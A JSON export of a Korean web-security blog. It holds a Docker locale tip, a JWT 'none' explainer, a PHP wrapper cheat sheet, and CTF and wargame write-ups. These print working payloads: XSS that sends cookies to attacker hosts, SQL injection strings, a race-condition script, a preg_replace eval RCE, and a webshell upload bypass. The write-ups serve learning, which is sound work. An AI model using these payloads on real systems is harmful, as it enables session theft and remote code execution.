{"meta":{"title":"JHYEON BLOG","subtitle":"Web Development & Security Research","description":"정동현(JHYEON BLOG)","author":"jhyeon","url":"https://blog.jhyeon.dev","root":"/"},"pages":[{"title":"All Category","date":"2021-01-17T07:38:25.000Z","updated":"2021-01-17T07:39:42.206Z","comments":true,"path":"categories/index.html","permalink":"https://blog.jhyeon.dev/categories/index.html","excerpt":"","text":""},{"title":"All Tags","date":"2021-01-17T07:38:15.000Z","updated":"2021-01-17T07:39:23.265Z","comments":true,"path":"tags/index.html","permalink":"https://blog.jhyeon.dev/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"(ko) Docker Language Setting","slug":"dockerset-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T08:35:55.650Z","comments":true,"path":"2020/04/22/dockerset-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/dockerset-200422/","excerpt":"","text":"1. 설정 변경 사항1sudo apt-get install locales 123456export LANGUAGE=ko_KR.UTF-8export LANG=ko_KR.UTF-8source ~/.bashrclocale-gen ko_KR ko_KR.UTF-8update-locale LANG=ko_KR.UTF-8dpkg-reconfigure locales 근데 한글화가 필요하면, 도커 빌드 때 미리 해두는게 솔직히 편하다.. 그래서 아래에 도커 빌드 설정도 첨부해보려 한다. Dockerfile 12345678RUN apt-get install language-pack-ko -yRUN apt-get install fonts-nanum -yRUN apt-get install fonts-nanum-coding -yRUN locale-gen ko_KR.UTF-8ENV LANG ko_KR.UTF-8ENV LANGUAGE ko_KR.UTF-8ENV LC_ALL ko_KR.UTF-8","categories":[{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/categories/Docker/"}],"tags":[{"name":"Dockerfile, Docker","slug":"Dockerfile-Docker","permalink":"https://blog.jhyeon.dev/tags/Dockerfile-Docker/"}]},{"title":"JWT None Type Injection","slug":"jwtinjection-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T08:41:27.537Z","comments":true,"path":"2020/04/22/jwtinjection-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/jwtinjection-200422/","excerpt":"","text":"1. JWT(JSON WEB TOKEN)JWT(JSON WEB TOKEN) 란, 정보를 안전하게 전송하기 위해 개발된 RFC 7519 의 웹 표준 입니다. JSON 객체를 통해 “self-contained” 방식으로 데이터를 전송합니다. 2. JWT TOKENJWT는 아래와 같은 형태를 가지고 있고, Header, Signature, Payload 3개의 부분으로 나뉘어져 있고 이는 .(dot) 으로 구분됩니다. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiamh5ZW9uIn0.QmGHY7ZS7SmWSy_VFr93F342f1jIEAv_WuK_gHKbyL8 헤더(Header) 에는 alg(암호화 알고리즘), typ(token type) 값이 들어가게 됩니다. 1234&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125; 두번째 부분인 페이로드(Payload) 부분에는 토큰의 클레임(Claim) 즉, 객체나 데이터 값이 들어가게 됩니다. 123&#123; &quot;name&quot;: &quot;jhyeon&quot;&#125; 세번째는 서명(Signature)가 들어갑니다. 서명에는 암호 알고리즘에 대한 정보가 들어가는데, 이러한 서명은 중간자에 의해 변조되지 않았다는 걸 증명 또는 검증하기 위해 사용합니다. 1234HMACSHA256( base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret) 위와 같이 세가지 부분을 각각 BASE64 인코딩을 통하여 JWT 토큰 값으로 사용하게 됩니다. 3. How to JWT None Type Attack?JWT None Type Attack 란, JWT 토큰의 헤더 부분 alg(암호화 알고리즘) 을 조작함으로써 발생하는 공격입니다. 1234&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125; 일반적인 JWT 토큰에 대한 암호화 알고리즘은 HS256과 같이 형태를 가지고 있는데, 이 알고리즘을 “None” 타입으로 변조하여 Signature(검증) 부분을 우회할 수 있게 되므로, \b잘못된 방법으로 JWT 토큰을 사용한다면 취약점이 발생할 수 있습니다. 따라서, 알고리즘을 조작하여 JWT 토큰을 변조하지 못하도록 토큰 생성시에 임의의 secret-key 를 사용하는 것이 안전합니다. 참고 : https://jwt.io","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"Web, JWT","slug":"Web-JWT","permalink":"https://blog.jhyeon.dev/tags/Web-JWT/"}]},{"title":"php wrapper","slug":"phpwrapper-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T08:41:21.776Z","comments":true,"path":"2020/04/22/phpwrapper-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/phpwrapper-200422/","excerpt":"","text":"12345expect:// expect://lsphp:filter php://filter/convert.base64-encode/resource=index.phpzip:// zip://filename.zip#webshell.phpdata:// data://text/plain;base64,&#123;RCE CODE HERE&#125;php://input echo base64_encode(file_get_contents(&quot;filename&quot;));","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"Web, PHP","slug":"Web-PHP","permalink":"https://blog.jhyeon.dev/tags/Web-PHP/"}]},{"title":"Mprotect Exploitation","slug":"pwn-mprotect-200422","date":"2020-04-21T15:00:00.000Z","updated":"2021-01-17T08:41:18.525Z","comments":true,"path":"2020/04/22/pwn-mprotect-200422/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/22/pwn-mprotect-200422/","excerpt":"","text":"1. 참고 링크(Notion) Notion : https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b5468e22b7374301","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"Pwn, Mprotect, Shellcode, Exploitation","slug":"Pwn-Mprotect-Shellcode-Exploitation","permalink":"https://blog.jhyeon.dev/tags/Pwn-Mprotect-Shellcode-Exploitation/"}]},{"title":"angstorm ctf 2020 Write up","slug":"angstormctf-200410","date":"2020-04-09T15:00:00.000Z","updated":"2021-01-17T08:24:48.651Z","comments":true,"path":"2020/04/10/angstormctf-200410/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/10/angstormctf-200410/","excerpt":"","text":"1. [WEB - The Magic Word]12345678910&lt;script&gt; var msg = document.getElementById(&quot;magic&quot;); setInterval(function() &#123; if (magic.innerText == &quot;please give flag&quot;) &#123; fetch(&quot;/flag?msg=&quot; + encodeURIComponent(msg.innerText)) .then(res =&gt; res.text()) .then(txt =&gt; magic.innerText = txt.split``.map(v =&gt; String.fromCharCode(v.charCodeAt(0) ^ 0xf)).join``); &#125;&#125;, 1000);&lt;/script&gt; magic 텍스트의 값을 please give flag 으로 바꿔주면 된다. 2. [WEB - Xmas Still Stands]문제 내 post 기능에서 xss 취약점이 발생한다. 글을 써놓고 report 기능을 통해 게시글 번호를 전송해주면 봇이 내 글에 방문하기 때문에 리다이렉션으로 돌려놓고 포트 열고 대기하면 쿠키값이 날아오는데 날아오는 쿠키값으로 페이지 내 쿠키를 다시 세팅해주고 /admin 으로 접속하면 된다. 1&lt;img src=&quot;#&quot; onerror=this.src=&#x27;https://IP:9999/?cookie=&#x27;+document.cookie/&gt; GET /?c=super_secret_admin_cookie=hello_yes_i_am_admin;%20admin_name=Jamie HTTP/1.1-&gt; super_secret_admin_cookie=hello_yes_i_am_admin 3. [WEB - Consolation]1&lt;button onclick=&quot;nofret()&quot; style=&quot;height:150px; width:150px;&quot;&gt;pay me some money&lt;/button&gt; 먼저 이 버튼을 누르면 nofret() 라는 함수를 호출 시키는데 이 함수를 따라가면 다음과 같다. 1function nofret()&#123;document[_0x4229(&#x27;0x95&#x27;,&#x27;kY1#&#x27;)](_0x4229(&#x27;0x9&#x27;,&#x27;kY1#&#x27;))[_0x4229(&#x27;0x32&#x27;,&#x27;yblQ&#x27;)]=parseInt(document[_0x4229(&#x27;0x5e&#x27;,&#x27;xtR2&#x27;)](_0x4229(&#x27;0x2d&#x27;,&#x27;uCq1&#x27;))[&#x27;innerHTML&#x27;])+0x19;console[_0x4229(&#x27;0x14&#x27;,&#x27;70CK&#x27;)](_0x4229(&#x27;0x38&#x27;,&#x27;rwU*&#x27;));console[&#x27;clear&#x27;]();&#125; [_0x4229(‘0x95’,’kY1#’)] 이 값을 chrome console 에서 실행시키면 어떤 값인지 알 수 있다. (getelementbyid) 순서대로 콘솔에 실행시켜보면 결과적으로, 0x4229(‘0x38’,’rwU*’) 이 값이 FLAG 를 가지고 있고, 콘솔에서 실행시키면 플래그를 얻을 수 있다. 4. [WEB - Git Good]아무것도 없는 Hello world 출력만 된 페이지이다, 문제의 이름 답게 /.git/ 을 통해 repository 저장소를 다운로드 할 수 있다. git clone https://gitgood.2020.chall.actf.co/.git/ 해당 저장소를 다운받아서 보면, thisistheflag.txt 라는 파일이 있는데 아무것도 없다, 그래서 커밋된 정보를 확인하기 위해 git show 를 해보면, 플래그가 있다. 1234--- a&#x2F;thisistheflag.txt+++ b&#x2F;thisistheflag.txt@@ -1,3 +1 @@-actf&#123;b3_car3ful_wh4t_y0u_s3rve_wi7h&#125; 5. [WEB - Secret Agents]처음엔 고민좀 해보다가 user-agent injection 을 통해서 문제를 풀 수 있었다. user-agent 값에 ‘ or ‘1’ = ‘1# 과 같이 injection 을 하나씩 해주고 사이트에 들어가보면 오류 메세지가 각각 다르게 반환되는 것을 볼 수 있다. 결과적으로 ‘ or ‘1’ = ‘1’ limit 2,1# 를 user-agent 값에 주입 하면 플래그가 있는 페이지를 볼 수 있다.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web, CTF","slug":"Web-CTF","permalink":"https://blog.jhyeon.dev/tags/Web-CTF/"}]},{"title":"zer0pts 2020 Write up","slug":"zer0ptsctf-200410","date":"2020-04-09T15:00:00.000Z","updated":"2021-01-17T08:30:09.452Z","comments":true,"path":"2020/04/10/zer0ptsctf-200410/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/10/zer0ptsctf-200410/","excerpt":"","text":"1. [web] can you guess it?(338 pt)12345678910111213141516171819202122&lt;?phpinclude &#x27;config.php&#x27;; // FLAG is defined in config.phpif (preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125;if (isset($_GET[&#x27;source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&#x27;guess&#x27;])) &#123; $guess = (string) $_POST[&#x27;guess&#x27;]; if (hash_equals($secret, $guess)) &#123; $message = &#x27;Congratulations! The flag is: &#x27; . FLAG; &#125; else &#123; $message = &#x27;Wrong.&#x27;; &#125;&#125;?&gt; 1234if (isset($_GET[&#x27;source&#x27;])) &#123; highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;])); exit();&#125; 해당 부분을 보면 PHP_SELF 인자를 이용해서 다른 경로의 파일을 읽어올 수 있다. 12345&lt;?phpif (preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123; exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125; config.php 파일에 flag가 있기 때문에 이 파일을 읽어주면 되는데, 정규식 표현으로 입력값 필터링을 하고 있다. 그런데 php 에서 basename 함수는 문자 \\x80 ~ xff 까지의 범위는 무시하기 때문에 적절하게 이용할 수 있다면 필터링 우회가 가능하다. index.php/config.php/%80?source 2. [web] music blog(653 pt)123456789101112131415161718192021222324&lt;?php// (snipped)const flag = &#x27;zer0pts&#123;&lt;censored&gt;&#125;&#x27;;// (snipped)const crawl = async (url) =&gt; &#123; console.log(`[+] Query! ($&#123;url&#125;)`); const page = await browser.newPage(); try &#123; await page.setUserAgent(flag); await page.goto(url, &#123; waitUntil: &#x27;networkidle0&#x27;, timeout: 10 * 1000, &#125;); await page.click(&#x27;#like&#x27;); &#125; catch (err)&#123; console.log(err); &#125; await page.close(); console.log(`[+] Done! ($&#123;url&#125;)`)&#125;; 문제에 보면 게시글을 올릴 수 있는 기능이 있다. 그리고 worker.js 파일을 보면 봇이 쿠키를 가지고 있음을 알 수 있다. 그럼 두가지를 요약해서 보면 봇이 내 게시글을 읽어서 봇의 쿠키를 빼돌려야 한다. 123456789101112131415&lt;section&gt; &lt;div class=&quot;container&quot;&gt; &lt;h1 class=&quot;mt-4&quot;&gt; &lt;?php if ($post[&#x27;published&#x27;] === &#x27;0&#x27;) &#123; ?&gt;&lt;span class=&quot;badge badge-secondary&quot;&gt;Secret&lt;/span&gt;&lt;?php &#125; ?&gt; &lt;?= $post[&#x27;title&#x27;] ?&gt; &lt;/h1&gt; &lt;span class=&quot;text-muted&quot;&gt;by &lt;?= $post[&#x27;username&#x27;] ?&gt; &lt;span class=&quot;badge badge-love badge-pill&quot;&gt;♥ &lt;?= $post[&#x27;likes&#x27;] ?&gt;&lt;/span&gt;&lt;/span&gt; &lt;div class=&quot;mt-3&quot;&gt; &lt;?= render_tags($post[&#x27;content&#x27;]) ?&gt; &lt;/div&gt; &lt;div class=&quot;mt-3&quot;&gt; &lt;a href=&quot;like.php?id=&lt;?= $post[&#x27;id&#x27;] ?&gt;&quot; id=&quot;like&quot; class=&quot;btn btn-love&quot;&gt;♥ Like this post&lt;/a&gt; &lt;/div&gt; &lt;/div&gt;&lt;/section&gt; 게시글을 올리면 제목, 내용 그리고 like(좋아요?) 같은 버튼이 만들어 진다. 로직을 보면 봇이 like 버튼을 눌러주고 도망가는 구조이기 때문에 이 like 버튼을 누를 때 리다이렉션을 시켜서 서버로 플래그가 날아오게 하면 될 것 같다. 12345function render_tags($str) &#123; $str = preg_replace(&#x27;/\\[\\[(.+?)\\]\\]/&#x27;, &#x27;&lt;audio controls src=&quot;\\\\1&quot;&gt;&lt;/audio&gt;&#x27;, $str); $str = strip_tags($str, &#x27;&lt;audio&gt;&#x27;); // only allows `&lt;audio&gt;` return $str;&#125; 하지만 입력값 필터링이 걸려 있다. 그런데 strip_tags 함수를 사용하는데 이 함수에서 /(slash) 를 사용하면 audio -&gt; a/udio -&gt; a 태그로 만들어 낼 수 있다. 즉, 태그를 만들어 주고 like 클릭 이벤트를 다른 서버로 돌려서 플래그를 탈취하면 된다. 1&lt;a/udio href=&#x27;myip.kr:12345&#x27; id=&#x27;like&#x27;&gt;like","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web, CTF","slug":"Web-CTF","permalink":"https://blog.jhyeon.dev/tags/Web-CTF/"}]},{"title":"zixem challenge Write up","slug":"zixemchall-200410","date":"2020-04-09T15:00:00.000Z","updated":"2021-01-17T08:41:50.555Z","comments":true,"path":"2020/04/10/zixemchall-200410/","link":"","permalink":"https://blog.jhyeon.dev/2020/04/10/zixemchall-200410/","excerpt":"","text":"Site : https://www.zixem.altervista.org/SQLi/ 1. LEVEL-11id=0%20union%20select%201,version(),3;--%20- 2. LEVEL-21showprofile=0%27%20union%20select%201,2,version(),4;--%20- 3. LEVEL-31item=0%27%20unionon%20select%201,2,version(),4;--%20- 4. LEVEL-41ebookid=0%27%20union%20select%201,2,3,version(),5;--%20- 5. LEVEL-5123456789101112#!/usr/bin/pythonimport requestsfor i in range(0,2000):param = &quot;http://www.zixem.altervista.org/SQLi/login_do.php?pass=&quot;+str(i)r = requests.get(param)print paramif &quot;Brute Force&quot; in r.text: print &quot;found key: &quot; + str(i) break 6. LEVEL-61serial=0%20and%201=1%20union%20select%20id,teacher,teacher_age,price%20from%20teachers%20%20where%20id=11%23 7. LEVEL-71id=0%20union%20select%201,version(),3;--%20- 8. LEVEL-81id=0%09union%09seselectlect%091,version(),3;--%09- 9. LEVEL-910%27%20union%20select%20&quot;../etc/passwd&quot;,2;--%20- 10. LEVEL-10 php uuencode -&gt; base64 encode x=PywiIVU7RkVPO0IhUzk2UUU4VzBALDJRVjk3KVM6Nl1OKiJEWysyVEArMGBgCmAK ALL CLEAR","categories":[{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"}],"tags":[{"name":"Web, Wargame","slug":"Web-Wargame","permalink":"https://blog.jhyeon.dev/tags/Web-Wargame/"}]},{"title":"TRUST CTF 2019 Write up","slug":"trustctf-200223","date":"2020-02-22T15:00:00.000Z","updated":"2021-01-17T08:20:40.416Z","comments":true,"path":"2020/02/23/trustctf-200223/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/23/trustctf-200223/","excerpt":"","text":"1. (web) ezrc12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php session_start(); include &#x27;config.php&#x27;; ?&gt;&lt;?php if(!isset($_SESSION[&#x27;id&#x27;]))&#123; header(&#x27;Location: ./login.html&#x27;); exit; &#125;?&gt;&lt;a href=&quot;source.php&quot;&gt;&lt;button&gt;source code&lt;/button&gt;&lt;br/&gt;&lt;/a&gt;&lt;?php $id = $_SESSION[&#x27;id&#x27;]; $res = mysqli_query($con, &quot;select pw from ezrc where id=&#x27;$id&#x27;&quot;); $idx = mysqli_fetch_array($res); $pw = $idx[&#x27;pw&#x27;]; $print_query = &quot;select chk from ezrc where id=&#x27;$id&#x27;&quot;; $hehe_query = &quot;update ezrc set chk=&#x27;$hehe&#x27; where id=&#x27;$id&#x27;&quot;; $reset_query = &quot;update ezrc set chk=&#x27;nope&#x27; where id=&#x27;$id&#x27;&quot;; echo &quot;&lt;a href=logout.php&gt;logout&lt;/a&gt;&lt;br/&gt;&quot;; echo &quot;your id is &quot;.$id.&quot;&lt;br/&gt;&quot;; if(preg_match(&quot;/(tata|dada|zaza)+[a-z]&#123;3&#125;+coco?hehe/&quot;, $_GET[&#x27;key&#x27;]) &amp;&amp; strlen($_GET[&#x27;key&#x27;])&gt;30)&#123; $res = mysqli_query($con, $print_query); $idx = mysqli_fetch_array($res); echo &quot;your chk is &quot;.$idx[&#x27;chk&#x27;].&quot;&lt;br/&gt;&quot;; if($idx[&#x27;chk&#x27;] == $hehe)&#123; echo $flag.&quot;&lt;br/&gt;&quot;; mysqli_query($con, $reset_query); exit(&quot;congratulations&quot;); &#125; &#125; mysqli_query($con, $hehe_query); $str = &quot;trust_is_very_cooool&quot;; $t = (int)$_GET[&#x27;times&#x27;]; if($pw == md5(240610708))&#123; echo &quot;pw right&quot;; for($i=0; $i&lt;$t; $i=$i+1)&#123; for($j=0; $j&lt;$t; $j=$j+1)&#123; $str = md5($str); &#125; &#125; if($str == &quot;d91a2796ab967c9793ef1c628a91fac5&quot;)&#123; echo $flag; &#125; else&#123; mysqli_query($con, $reset_query); &#125; &#125; else&#123; mysqli_query($con, $reset_query); &#125;?&gt; 레이스 컨디션(race condition) 을 이용하는 문제이다. 서로 다른 브라우저(세션) 을 가지고 동시에 요청하면 다른 한 브라우저에서 플래그를 넘겨준다. CTF에서 레이스 컨디션을 사용한 문제를 본 것이 조금 신기하다. (잘 못보던 케이스) 암튼 파이썬으로 코딩해서 문제를 풀어주면 된다. 12345678910111213141516171819202122232425262728293031import requestsimport threadingcookie1 = &#123;&#x27;PHPSESSID&#x27;:&#x27;bb11&#x27;&#125;cookie2 = &#123;&#x27;PHPSESSID&#x27;:&#x27;bb22&#x27;&#125;def login(cookie): url = &quot;http://198.13.32.181:4345/login_check.php&quot; param = &#123;&#x27;id&#x27;:&#x27;bb&#x27;,&#x27;pw&#x27;:&#x27;bb&#x27;&#125; r = requests.post(url, data=param, cookies=cookie) print r.textdef times(): global cookie1; url = &quot;http://198.13.32.181:4345/index.php?times=111111111111111111111111111111&quot; r = requests.get(url, cookies=cookie1)def flag(): global cookie2; url = &quot;http://198.13.32.181:4345/index.php?key=tatadadazazaabccocoheheaaaaaaaaaaaaa&quot; r = requests.get(url, cookies=cookie2) print r.textdef main(): login(cookie1) login(cookie2) t1 = threading.Thread(target=times,args=()) t2 = threading.Thread(target=flag,args=()) t1.start() t2.start()main() Thank you (NGA) 2. (web) jpg viewer12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&lt;?php session_start(); require_once __DIR__ . &#x27;/jwt.php&#x27;; if(!isset($_COOKIE[&#x27;PHPSESSJWT&#x27;]))&#123; $token = $jwt-&gt;hashing(array( &#x27;admin&#x27; =&gt; false, &#x27;iat&#x27; =&gt; time(), )); setcookie(&#x27;PHPSESSJWT&#x27;, $token, time() + 86400 * 30); &#125;?&gt; &lt;?php require_once __DIR__ . &#x27;/jwt.php&#x27;; $token = $_COOKIE[&#x27;PHPSESSJWT&#x27;]; if ($token) &#123; $body = $jwt-&gt;dehashing($token); &#125; if(isset($_GET[&#x27;source&#x27;]))&#123; echo highlight_file(__FILE__); exit; &#125; function imageanalyze($file)&#123; if(!is_file($file))&#123; echo &#x27;&lt;script&gt;alert(&quot;Where is the File?&quot;)&lt;/script&gt;&#x27;; exit; &#125; elseif(!exif_read_data($file))&#123; unlink($file); exit; &#125; else&#123; return exif_read_data($file); &#125; &#125; if(isset($_FILES[&#x27;JPG&#x27;]) &amp;&amp; $_FILES[&#x27;JPG&#x27;][&#x27;name&#x27;] != &quot;&quot;) &#123; $file = $_FILES[&#x27;JPG&#x27;]; $upload_directory = &#x27;./uploads/&#x27;; $ext_str = array(&quot;jpg&quot;); $max_file_size = 5242880; $ext = explode(&#x27;.&#x27;,$file[&#x27;name&#x27;]); $ext = strtolower(array_pop($ext)); if(!in_array($ext, $ext_str)) &#123; echo &quot;&lt;script&gt;alert(&#x27;jpg파일만 업로드 할 수 있습니다.&#x27;)&lt;/script&gt;&quot;; exit; &#125; if($file[&#x27;size&#x27;] &gt;= $max_file_size) &#123; echo &quot;&lt;script&gt;alert(&#x27;파일은 5MB 까지만 업로드 가능합니다.&#x27;)&lt;/script&gt;&quot;; exit; &#125; $path = $upload_directory.session_id(); $updir = $path.&#x27;/&#x27;.$file[&#x27;name&#x27;]; mkdir($path,0777); if(move_uploaded_file($file[&#x27;tmp_name&#x27;],$updir)) &#123; echo &quot;&lt;script&gt;alert(&#x27;파일 업로드 성공!&#x27;)&lt;/script&gt;&quot;; echo &quot;&lt;img src=&#x27;$updir&#x27;&gt;&quot;; $infor = imageanalyze($updir); &#125; else&#123; echo &quot;&lt;script&gt;alert(&#x27;업로드 에러!&#x27;)&lt;/script&gt;&quot;; exit; &#125; &#125; ?&gt; &lt;?php if(isset($infor))&#123; $Date = $infor[&#x27;DateTimeOriginal&#x27;]; $Model = $infor[&#x27;Model&#x27;]; $Make = $infor[&#x27;Make&#x27;]; $size = round($infor[&#x27;FileSize&#x27;]/1024,1); echo &quot;&lt;br&gt;파일명 : &#123;$infor[&#x27;FileName&#x27;]&#125;&lt;br&gt;&quot;; echo &quot;파일 크기 : &#123;$size&#125;KB&lt;br&gt;&quot;; if(array_key_exists(&#x27;DateTimeOriginal&#x27;,$infor))&#123; echo &quot;촬영 시간 : &#123;$Date&#125;&lt;br&gt;&quot;; &#125; else&#123; $date = date(&quot;Y-m-d H:i:s&quot;, $infor[&#x27;FileDateTime&#x27;]); echo &quot;업로드 시간 : &#123;$date&#125;&lt;br&gt;&quot;; &#125; if(array_key_exists(&#x27;Model&#x27;,$infor)&amp;&amp;isset($infor[&#x27;Model&#x27;]))&#123; echo &quot;카메라 모델 : &#123;$Model&#125;&lt;br&gt;&quot;; &#125; &#125; if($body[&#x27;admin&#x27;]==true)&#123; $edit = explode(&#x27;.&#x27;,$_COOKIE[&#x27;edit&#x27;]); preg_replace($$edit[0],$$edit[1],$$edit[2]); &#125; ?&gt; 이번에도 코드가 좀 길다, 한번 분석해보자. 1234if($body[&#x27;admin&#x27;]==true)&#123; $edit = explode(&#x27;.&#x27;,$_COOKIE[&#x27;edit&#x27;]); preg_replace($$edit[0],$$edit[1],$$edit[2]); &#125; 이 부분에 보면 쿠키 값의 admin이 true를 가질 때, edit의 쿠키를 가지고 preg_replace 함수의 인자로 사용한다. 처음엔 좀 생각 했는데, 검색 하다가 우연히 preg_replace 함수에 대해 RCE 문서를 찾을 수 있었다. 그렇다 이 문제도 동일한 취약점을 사용하고 있다. 1234$Date = $infor[&#x27;DateTimeOriginal&#x27;];$Model = $infor[&#x27;Model&#x27;];$Make = $infor[&#x27;Make&#x27;];$size = round($infor[&#x27;FileSize&#x27;]/1024,1); 이 부분에서 업로드 하는 jpg 파일의 사진 정보 값을 담고 출력 해주니, $model, $make 에 공격 페이로드를 넣고 admin 쿠키를 조작 해 preg_replace 함수로 흘러가게 해주면 된다. 세션 조작은 문제에서 만들어주는 형태와 동일하게 새 jwt 세션을 만들어서 바꿔주면 된다. (아래 참고) 12345678910&lt;?phprequire_once &quot;jwt.php&quot;;$jwt = new jwt();$token = $jwt-&gt;hashing(array( ‘admin’=&gt;’true’, ‘iat’=&gt;time()));var_dump($token);?&gt; Model=/a/e &amp; Make=eval(base64_decode(‘c3lzdGVtKCRfR0VUWydjbWQnXSk7’));?cmd=ls &amp; ?cmd=/flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web, CTF","slug":"Web-CTF","permalink":"https://blog.jhyeon.dev/tags/Web-CTF/"}]},{"title":"ROP & SSE Instruction","slug":"rop-instruction-200210","date":"2020-02-09T15:00:00.000Z","updated":"2021-01-17T08:16:55.377Z","comments":true,"path":"2020/02/10/rop-instruction-200210/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/10/rop-instruction-200210/","excerpt":"","text":"Linkhttps://www.notion.so/jhyeon/ROP-SSE-Instruction-ca573f7740ae4301ad61b455a140b659","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"Pwn, ROP","slug":"Pwn-ROP","permalink":"https://blog.jhyeon.dev/tags/Pwn-ROP/"}]},{"title":"DIMICTF 2019 Write up","slug":"dimictf-200206","date":"2020-02-05T15:00:00.000Z","updated":"2021-01-17T08:07:13.718Z","comments":true,"path":"2020/02/06/dimictf-200206/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/06/dimictf-200206/","excerpt":"","text":"1. web(5shared)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phprequire_once &#x27;lib.php&#x27;;session_start();$session = md5(session_id());$uploaddir = __DIR__ . &quot;/~uploads/&#123;$session&#125;/&quot;;createDirectory(__DIR__ . &quot;/~uploads/&quot;);createDirectory($uploaddir);//print_r($_FILES[&#x27;file&#x27;]);$file = $_FILES[&#x27;file&#x27;];$uploadfile = $uploaddir . $file[&#x27;name&#x27;];// sanity check$extension = explode(&#x27;.&#x27;, $file[&#x27;name&#x27;])[1];if (!in_array($extension, Array(&quot;jpg&quot;, &quot;gif&quot;, &quot;png&quot;)))&#123; $message = &quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125;// the real sanity check$real_extension = array_pop(explode(&#x27;.&#x27;, $file[&#x27;name&#x27;]));if (preg_match(&quot;/php/i&quot;, $file[&#x27;name&#x27;]))&#123; $message = &quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125;if ($file[&#x27;size&#x27;] &gt; 4096)&#123; $message = &quot;&lt;script&gt;alert(&#x27;최대 4mb까지 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125;if (move_uploaded_file($file[&#x27;tmp_name&#x27;], $uploadfile))&#123; $message = &quot;&lt;script&gt;alert(&#x27;성공적으로 파일이 업로드되었습니다.&#x27;); location.href = &#x27;/&#x27;; &lt;/script&gt;&quot;; echo $message;&#125;else&#123; $message = &quot;&lt;script&gt;alert(&#x27;업로드 에러&#x27;); history.back(); &lt;/script&gt;&quot;; echo $message;&#125; 코드가 좀 긴편인데 주요 부분들만 한번 확인 해보자, 123456789101112131415// sanity check$extension = explode(&#x27;.&#x27;, $file[&#x27;name&#x27;])[1];if (!in_array($extension, Array(&quot;jpg&quot;, &quot;gif&quot;, &quot;png&quot;)))&#123; $message = &quot;&lt;script&gt;alert(&#x27;jpg, gif, png 확장자만 업로드할 수 있습니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125;// the real sanity check$real_extension = array_pop(explode(&#x27;.&#x27;, $file[&#x27;name&#x27;]));if (preg_match(&quot;/php/i&quot;, $file[&#x27;name&#x27;]))&#123; $message = &quot;&lt;script&gt;alert(&#x27;파일 이름에 php가 들어가면 안됩니다.&#x27;); history.back(); &lt;/script&gt;&quot;; die($message);&#125; 웹쉘 업로드 문제이기 때문에 사실상 이 부분만 우회할 수 있다면 금방 풀 수 있다. sanity check 부분에 보면 argv[1] 로 오는 문자를 검사하는데,jpg, gif, png 만 허용시켜 둔 상황이다. 그런데 php에선 또 이상한 문제점이 우리를 반겨준다. 저렇게 검사할 경우에 다음과 같은 트릭을 사용할 수 있다. test.jpg test.jpg.phpjpg 뒤에 확장자를 하나 더 붙여서 실행 파일로 만들어 주면 확장자 검사를 피할 수 있다.근데 아래 real sanity check를 보면 php는 또 불가능 하기 때문에 php 대체 확장자를 써서 우회해주자. (phtml, php5 등) upload) test.jpg.phtml위와 같이 파일 명을 바꾸고, 웹 쉘을 업로드 시키면 된다. 2. (web) simple xss문제에 들어가면 게시판이 있는데 그냥 글쓰기 부분에서 xss payload 넣고,봇의 쿠키를 탈취하면 된다. 1location.href=&#x27;https://webhook.site/~&#x27;+document.cookie; 3. (web) simple 